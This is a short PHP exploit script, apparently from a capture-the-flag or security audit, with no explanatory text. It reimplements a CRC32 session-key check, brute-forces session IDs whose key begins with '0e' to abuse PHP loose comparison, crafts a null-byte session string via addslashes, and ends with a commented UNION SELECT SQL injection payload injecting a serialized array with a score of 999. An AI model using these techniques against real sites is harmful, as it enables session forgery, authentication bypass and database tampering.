<?php

function gen_session_key($aip, $session_id)
{
    static $ip = '';

    if ($ip == '') {
        $ip = substr($aip, 0, strrpos($aip, '.'));
    }

    return sprintf('%08x', crc32($ip . $session_id));
}
/*
$tmp_session_id = substr($session_id, 0, 32);
if (gen_session_key($aip, $tmp_session_id) == substr($session_id, 32))
{
    echo $session_id;
}
*/
/*
while (1) {
    $chars = "0123456789sadfghjklqwerttyuipoa";
    $chars  = str_shuffle($chars);
    $a = $chars . chr(0);
    $aip = "'dfgdhfjk#";
    $b = gen_session_key($aip, $a);
    if (substr($b, 0, 2) == "0e") {
        echo $a . "               ";
        echo $b;
        break;
    }
}
*/

$a = "2la59iuktagjo3s1wq78d4t6y0ehpfr" . chr(0) . "e1231d8";
echo addslashes($a) . "              ";
echo substr(addslashes($a), 0, 32);

//shaiu7g3tk52yoep01ajr9dqlwf468t\     0e1231d8
//7l9oauyjft8k6sa3rte2gh0wqdi451p 0ecb8558
//2la59iuktagjo3s1wq78d4t6y0ehpfr 0e6609e8

//and 1=2 union select 'a:2:{s:4:"name";s:5:"alias";s:5:"score";s:3:"999";}'
